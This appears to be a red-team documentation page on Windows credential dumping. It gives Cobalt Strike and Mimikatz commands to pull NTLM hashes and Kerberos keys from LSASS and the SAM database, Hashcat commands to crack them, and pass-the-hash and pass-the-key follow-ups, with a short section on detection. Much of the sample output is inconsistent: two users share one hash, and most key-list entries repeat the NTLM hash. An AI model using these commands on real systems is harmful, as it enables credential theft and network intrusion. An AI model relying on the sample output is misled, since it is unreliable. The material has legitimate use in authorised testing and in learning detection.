---
title: "Operating System Credential Harvesting"
date: 2026-09-25
weight: 2
type: docs
tags:
  - Active Directory
  - Credential Access
---

Operating System Credential Dumping comprises various methods [[T1003](https://attack.mitre.org/techniques/T1003/)] used by operators to extract secrets, hashes, and plaintext tokens maintained in memory or disk storage by the OS. Executing these sub-techniques effectively requires local administrator or `NT AUTHORITY\SYSTEM` privileges on the target endpoint.

This section covers the retrieval of cryptographic material from active process memory and local configuration databases.

## LSASS Memory Extraction

The Local Security Authority Subsystem Service (LSASS) process manages security policies, authenticates interactive users, generates access tokens, and holds credentials in memory for single sign-on purposes. Operators frequently target this process memory to harvest active security material [[T1003.001](https://attack.mitre.org/techniques/T1003/001/)].

Windows integrates authentication types through the Security Support Provider Interface (SSPI). Individual Security Support Providers (SSPs) load as DLL files inside LSASS at boot time, managing credentials according to their respective protocols:

* **NTLM**: Handles standard NTLM and NTLMv2 challenge-response verification.
* **Kerberos**: Validates and routes Kerberos v5 tickets.
* **Digest**: Processes challenge-response authentication for web-based endpoints and LDAP.
* **Schannel**: Manages public-key architectures, such as TLS/SSL sessions.
* **CredSSP**: Restores credentials to support single sign-on across Remote Desktop Services (RDS).

Because each provider manages user validation data uniquely, post-exploitation frameworks utilize targeted logic to parse data from specific providers. 

Cobalt Strike integrates an internal implementation of Mimikatz via the `mimikatz` command, alongside built-in aliases for common actions. The platform supports specialized prefix operators to alter execution context: prepend `!` to force automatic privilege escalation to SYSTEM prior to running the module (crucial for commands like `lsadump::sam`), or use `@` to force the tool to impersonate the current Beacon thread token (frequently applied when performing remote directory operations like `lsadump::dcsync`).

### NTLM Hashes

The `logonpasswords` command acts as a shortcut for `sekurlsa::logonpasswords`, exposing the NTLM hashes of users with active or recent sessions on the compromised system.

```bash
beacon> mimikatz sekurlsa::logonpasswords

User Name         : j_doe
Domain            : ARCADIA
Logon Server      : DC-1
Logon Time        : 17/02/2025 09:45:28
SID               : S-1-5-21-4192837465-1122334455-998877665-1105
	msv :	
	 [00000003] Primary
	 * Username : j_doe
	 * Domain   : ARCADIA
	 * NTLM     : a3f9e2b10cd8374e56910fad283c71bf
	 * SHA1     : b19cd8374f1a2e3b4c5d6e7f8a9b0c1d2e3f4a5b
	 * DPAPI    : d41d8cd98f00b204e9800998ecf8427e

User Name         : a_smith
Domain            : ARCADIA
Logon Server      : DC-1
Logon Time        : 17/02/2025 09:53:40
SID               : S-1-5-21-4192837465-1122334455-998877665-1108
	msv :	
	 [00000003] Primary
	 * Username : a_smith
	 * Domain   : ARCADIA
	 * NTLM     : a3f9e2b10cd8374e56910fad283c71bf
	 * SHA1     : b19cd8374f1a2e3b4c5d6e7f8a9b0c1d2e3f4a5b
	 * DPAPI    : e4d909c290d0fb1ca068ffaddf22cbd0
```

Operators process these retrieved NTLM hashes offline using Hashcat with hash mode `1000`.

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\wordlist.txt -r .\rules\best.rule
a3f9e2b10cd8374e56910fad283c71bf:ArcadiaPass2026!
```

Alternatively, these hashes can be supplied directly to Pass-the-Hash deployment techniques to authenticate across the network without cracking them.

### Kerberos Cryptographic Keys

The `sekurlsa::ekeys` command extracts Kerberos encryption keys tied to authenticated sessions from memory.

```bash
User Name         : j_doe
Domain            : ARCADIA
Logon Server      : DC-1
Logon Time        : 17/02/2025 09:45:28
SID               : S-1-5-21-4192837465-1122334455-998877665-1105

	 * Username : j_doe
	 * Domain   : ARCADIA.LOCAL
	 * Password : (null)
	 * Key List :
	   des_cbc_md4       8b3c94fd28e1a7b63f0d2c918374f6e5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
	   des_cbc_md4       a3f9e2b10cd8374e56910fad283c71bf
	   des_cbc_md4       a3f9e2b10cd8374e56910fad283c71bf
	   des_cbc_md4       a3f9e2b10cd8374e56910fad283c71bf
	   des_cbc_md4       a3f9e2b10cd8374e56910fad283c71bf
	   des_cbc_md4       a3f9e2b10cd8374e56910fad283c71bf

User Name         : a_smith
Domain            : ARCADIA
Logon Server      : DC-1
Logon Time        : 17/02/2025 09:53:40
SID               : S-1-5-21-4192837465-1122334455-998877665-1108

	 * Username : a_smith
	 * Domain   : ARCADIA.LOCAL
	 * Password : (null)
	 * Key List :
	   des_cbc_md4       2c9a1b8e7d6f5c4b3a2e1d0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2e1d0f
	   des_cbc_md4       a3f9e2b10cd8374e56910fad283c71bf
	   des_cbc_md4       a3f9e2b10cd8374e56910fad283c71bf
	   des_cbc_md4       a3f9e2b10cd8374e56910fad283c71bf
	   des_cbc_md4       a3f9e2b10cd8374e56910fad283c71bf
	   des_cbc_md4       a3f9e2b10cd8374e56910fad283c71bf
```

* *Note*: Mimikatz often inaccurately lists extracted ciphers as `des_cbc_md4`. Verify the string length to categorize the key: a 64-character value represents an `aes256-cts-hmac-sha1-96` string, whereas 32-character entries denote `aes128-cts-hmac-sha1-96` or legacy `rc4_hmac` components.

Cracking complex AES-256 strings requires significant processing time compared to standard NTLM due to salting. For perspective, an entry-level modern GPU handles NTLM computations near 140 GH/s, while processing AES-256 constraints caps performance significantly near 1375 kH/s. To target an AES-256 hash offline using Hashcat mode `28900`, match the target syntax format: `$krb5db$18$<username>$<DOMAIN-FQDN>$<hash>`.

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 28900 .\aes256.hash .\wordlist.txt -r .\rules\best.rule
$krb5db$18$a_smith$ARCADIA.LOCAL$2c9a1b8e7d6f5c4b3a2e1d0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2e1d0f:ArcadiaPass2026!
```

In live engagements, operators find it more practical to inject these keys directly into memory via Pass-the-Key strategies to generate valid TGT sessions.

### Operational Security (OPSEC)

Querying LSASS directly carries significant detection risks and should be heavily minimized. Security products and Endpoint Detection and Response (EDR) agents leverage kernel callouts via `ObRegisterCallbacks` to flag anomalous handle requests targeting critical processes. Sysmon records these attempts under Event ID 10 (Process Access) when monitoring memory reads against LSASS.

```bash
Process accessed:

SourceProcessId: 6124
SourceThreadId: 4112
SourceImage: C:\Windows\system32\rundll32.exe
TargetProcessId: 816
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1010
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d9b4|C:\Windows\System32\KERNELBASE.dll+338ae|UNKNOWN(00000182BAF82143)
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM
```

* An access mask value matching `0x1010` strongly indicates that a process opened a handle requesting `PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ` rights—the minimum programmatic access required to execute a memory dump.

## Security Account Manager (SAM) Database

The Security Account Manager (SAM) database stores local account usernames and corresponding password cryptographic material. These structures reside within the `HKLM\SAM` and `HKLM\SYSTEM` registry hives, where operators attempt to extract local account identities [[T1003.002](https://attack.mitre.org/techniques/T1003/002/)].

```bash
beacon> mimikatz !lsadump::sam

Domain : ARCADIA-WKSTN
SysKey : c182bda4950e0f6a73a3449ddd88432c
Local SID : S-1-5-21-1234567890-5555555555-666666666

SAMKey : b285741ca6fa699fbbf1d410bfbe49d2

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a3f9e2b10cd8374e56910fad283c71bf
    lm  - 0: 5c3d7e6fc87fe295603b423c72f9b271
    ntlm- 0: a3f9e2b10cd8374e56910fad283c71bf
    ntlm- 1: a3f9e2b10cd8374e56910fad283c71bf
```

The localized RID-500 Administrator profile functions independently of the central Domain Administrator account and is typically locked by default administrative policy. However, harvesting this value remains useful if the local profile is actively enabled and uses matching credentials across multiple systems in the target network tier.

## LSA Secrets

LSA Secrets is a protected storage container managed by the Local Security Authority to maintain sensitive, system-wide configuration elements. This storage houses miscellaneous high-value data blocks, including service account passwords, cached domain credentials from disconnected sessions, and system account hashes.
